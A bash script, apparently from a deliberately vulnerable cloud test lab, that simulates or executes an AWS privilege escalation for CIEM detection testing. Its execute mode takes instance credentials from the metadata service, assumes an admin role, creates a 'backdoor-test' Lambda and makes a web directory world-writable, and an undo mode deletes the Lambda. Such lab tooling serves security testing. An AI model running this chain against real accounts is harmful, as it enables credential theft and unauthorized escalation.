#!/bin/bash
# CIEM Test: EC2 Instance Role → Lambda Admin Role, with optional live AWS attack and undo

LAMBDA_NAME="cnappuccino-backdoor-test"
ROLE_ARN="${LAMBDA_ADMIN_ROLE_ARN:-arn-not-set}"
SESSION_NAME="CNAPPuccino-Test"
REGION="${AWS_DEFAULT_REGION:-us-east-1}"

# Accept --role-arn <ARN> as an override (ensures correct propagation)
while [[ $# -gt 0 ]]; do
  case "$1" in
    --role-arn) ROLE_ARN="$2"; shift 2 ;;
    *) break ;;
  esac
done

if [[ "$ROLE_ARN" == "arn-not-set" || -z "$ROLE_ARN" ]]; then
  echo "[ERROR] LambdaAdminRole ARN not set! (export LAMBDA_ADMIN_ROLE_ARN or pass --role-arn <ARN>)"
  exit 2
fi

usage() {
  cat <<USAGE
Usage: $0 [--simulate] [--execute] [--undo]

  Uses LambdaAdminRole ARN from LAMBDA_ADMIN_ROLE_ARN env var:
    export LAMBDA_ADMIN_ROLE_ARN="\${aws_iam_role.lambda_admin.arn}" # <-- Replace with Terraform interpolation in main.tf


  --simulate   Simulate all steps (default)
  --execute    Perform live attack: assume role, create Lambda
  --undo       Delete Lambda created during attack

Environment:
  - Uses aws CLI with instance or user role credentials
  - Role ARN: $ROLE_ARN
  - Region: $REGION
USAGE
}

simulate() {
  echo "[SIMULATE] CIEM Testing: EC2 Instance Role -> Lambda Admin Role"
  echo "[SIMULATE] Instance Role: CNAPPuccino-EC2-Role"
  echo "[SIMULATE] Available Role: $ROLE_ARN"
  echo "[SIMULATE] Simulate STS AssumeRole:"
  echo "aws sts assume-role --role-arn $ROLE_ARN --role-session-name $SESSION_NAME --region $REGION"
  echo "[SIMULATE] Simulate Lambda create-function:"
  echo "aws lambda create-function --function-name $LAMBDA_NAME --runtime python3.9 --handler lambda_function.lambda_handler --role \$ASSUMED_ROLE_ARN --zip-file fileb://function.zip --region $REGION"
  echo "[SIMULATE] Simulate Lambda delete-function:"
  echo "aws lambda delete-function --function-name $LAMBDA_NAME --region $REGION"
  echo "[SIMULATE] CIEM privilege escalation simulation complete"
}

execute() {
  echo "[EXECUTE] CIEM Test: Attempting real role escalation and Lambda creation"

  # If no AWS creds already set, query IMDS for credentials (works from CGI context)
  if [[ -z "$AWS_ACCESS_KEY_ID" || -z "$AWS_SECRET_ACCESS_KEY" || -z "$AWS_SESSION_TOKEN" ]]; then
    ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    if [[ -n "$ROLE_NAME" ]]; then
      CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)
      export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
      export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
      export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
      echo "[DEBUG] Pulled instance profile credentials from IMDS for role: $ROLE_NAME"
    else
      echo "[WARN] No IAM role name retrieved from IMDS; proceeding without injected creds."
    fi
  fi

  # Attempt to assume the Lambda Admin role
  CREDS_JSON=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "$SESSION_NAME" --region "$REGION" 2>/dev/null)
  if [[ -z "$CREDS_JSON" ]]; then
    echo "[ERROR] Failed to assume role. Does the IAM trust relationship permit this instance/user?"
    echo "------ FULL AssumeRole ERROR OUTPUT ------"
    aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "$SESSION_NAME" --region "$REGION"
    echo "-----------------------------------------"
    echo ""
    echo "[DEBUG] Current AWS identity:"
    aws sts get-caller-identity --region "$REGION"
    echo "[DEBUG] LambdaAdminRole ARN: $ROLE_ARN"
    echo "[DEBUG] EC2 Instance Role ARN (expected principal):"
    INSTANCE_PROFILE_ARN="$(curl -s http://169.254.169.254/latest/meta-data/iam/info | jq -r '.InstanceProfileArn' 2>/dev/null)"
    echo "    $INSTANCE_PROFILE_ARN"
    echo "[DEBUG] AWS Credential Source:"
    if [[ -n "$AWS_ACCESS_KEY_ID" ]]; then
      if [[ -n "$ROLE_NAME" ]]; then
        echo "  IMDS-provided: $AWS_ACCESS_KEY_ID for role $ROLE_NAME"
      else
        echo "  ENV-provided: $AWS_ACCESS_KEY_ID (env var only)"
      fi
    else
      echo "  [WARN] No AWS_ACCESS_KEY_ID set, likely no valid creds sourced!"
    fi
    echo "[DEBUG] AWS Session Token Expiry:"
    if [[ -n "$AWS_SESSION_TOKEN" ]]; then
      echo "$CREDS" | jq -r '.Expiration // empty'
    fi
    echo ""
    echo "[FALLBACK] LambdaAdminRole trust policy (for direct comparison):"
    aws iam get-role --role-name LambdaAdminRole --region "$REGION" | jq .Role.AssumeRolePolicyDocument
    echo ""
    echo "[FALLBACK] LambdaAdminRole role policy details:"
    # List and print all inline policies if any
    LAMBDA_ROLE_POLICIES=$(aws iam list-role-policies --role-name LambdaAdminRole --region "$REGION" | jq -r '.PolicyNames[]' 2>/dev/null)
    for pol in $LAMBDA_ROLE_POLICIES; do
      echo "Inline policy: $pol"
      aws iam get-role-policy --role-name LambdaAdminRole --policy-name "$pol" --region "$REGION" | jq .
    done
    echo "[FALLBACK] EC2 Instance Role policy and permissions:"
    EC2_ROLE=$(basename "$INSTANCE_PROFILE_ARN")
    aws iam get-role --role-name "$EC2_ROLE" --region "$REGION" | jq .Role.AssumeRolePolicyDocument
    EC2_POLICIES=$(aws iam list-role-policies --role-name "$EC2_ROLE" --region "$REGION" | jq -r '.PolicyNames[]' 2>/dev/null)
    for pol in $EC2_POLICIES; do
      echo "Inline policy: $pol"
      aws iam get-role-policy --role-name "$EC2_ROLE" --policy-name "$pol" --region "$REGION" | jq .
    done
    echo "[FALLBACK] Simulating EC2 role permissions for sts:AssumeRole to LambdaAdminRole:"
    aws iam simulate-principal-policy --policy-source-arn "$INSTANCE_PROFILE_ARN" --action-names "sts:AssumeRole" --resource-arns "$ROLE_ARN" --region "$REGION" | jq .
    echo ""
    echo "[DIAGNOSE]"
    echo "  - If 'AWS' Principal in LambdaAdminRole trust does not include the EC2 instance role ARN above, MODIFY the trust relationship in Terraform:"
    echo "      resource \"aws_iam_role\" \"lambda_admin\" {"
    echo "        assume_role_policy = data.aws_iam_policy_document.lambda_admin_trust.json"
    echo "      }"
    echo "  - And in the trust, add: identifiers = [expected EC2 role ARN]"
    echo "  - After fixing, run: terraform apply"
    echo ""
    echo "[FALLBACK] Try manually running the above AssumeRole call via SSH (not CGI context) for comparison:"
    echo "  aws sts assume-role --role-arn \"$ROLE_ARN\" --role-session-name \"debug-test\" --region \"$REGION\""
    echo "[FALLBACK] Print EC2 instance metadata for full context:"
    curl -s http://169.254.169.254/latest/meta-data/iam/info || echo "[WARN] Could not fetch IMDS"
    echo ""
    echo "[DEBUG] Tip: Credentials must be from the EC2 instance role defined in Terraform. Compare 'Role ARN' with LambdaAdminRole's trust policy."
    echo "[DEBUG] If IMDS access is blocked from CGI, try via SSH as the instance user."
    exit 1
  fi

  export AWS_ACCESS_KEY_ID=$(echo "$CREDS_JSON" | jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Credentials.SessionToken')

  # Ensure writable temp path for CGI and role contexts
  CGI_TMP_DIR="/var/www/html/tmp"
  mkdir -p "$CGI_TMP_DIR"
  chmod 777 "$CGI_TMP_DIR"

  # Create minimal Python Lambda in writable path
  echo "def lambda_handler(event, context):    return 'CNAPPuccino_Lambda_Test'" > "$CGI_TMP_DIR/lambda_function.py"
  zip "$CGI_TMP_DIR/function.zip" "$CGI_TMP_DIR/lambda_function.py"
 
  echo "[EXECUTE] Creating Lambda function: $LAMBDA_NAME"
  aws lambda create-function \
     --function-name "$LAMBDA_NAME" \
     --runtime python3.9 \
     --role "$ROLE_ARN" \
     --handler lambda_function.lambda_handler \
     --zip-file fileb://"$CGI_TMP_DIR/function.zip" \
     --region "$REGION" \
     >/dev/null 2>&1 && echo "[SUCCESS] Lambda created: $LAMBDA_NAME" || echo "[ERROR] Lambda creation failed"
 
  # Clean up local artifact
  rm -f "$CGI_TMP_DIR/function.zip" "$CGI_TMP_DIR/lambda_function.py"
}

undo() {
  echo "[UNDO] Attempting Lambda deletion: $LAMBDA_NAME"

  # Ensure role creds are still valid, otherwise re-assume role
  if [[ -z "$AWS_ACCESS_KEY_ID" || -z "$AWS_SECRET_ACCESS_KEY" || -z "$AWS_SESSION_TOKEN" ]]; then
    ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    if [[ -n "$ROLE_NAME" ]]; then
      CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)
      export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
      export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
      export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
      CREDS_JSON=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "$SESSION_NAME" --region "$REGION" 2>/dev/null)
      if [[ -n "$CREDS_JSON" ]]; then
        export AWS_ACCESS_KEY_ID=$(echo "$CREDS_JSON" | jq -r '.Credentials.AccessKeyId')
        export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.Credentials.SecretAccessKey')
        export AWS_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Credentials.SessionToken')
      fi
    fi
  fi

  aws lambda delete-function \
    --function-name "$LAMBDA_NAME" \
    --region "$REGION" \
    >/dev/null 2>&1 && echo "[SUCCESS] Lambda deleted: $LAMBDA_NAME" || echo "[ERROR] Lambda delete failed or not present"
}

main() {
  MODE="simulate"
  if [[ "$1" == "--execute" ]]; then
    MODE="execute"
  elif [[ "$1" == "--undo" ]]; then
    MODE="undo"
  elif [[ "$1" == "--simulate" ]] || [[ -z "$1" ]]; then
    MODE="simulate"
  else
    usage
    exit 1
  fi

  case "$MODE" in
    simulate) simulate ;;
    execute)  execute ;;
    undo)     undo ;;
  esac
}

main "$1"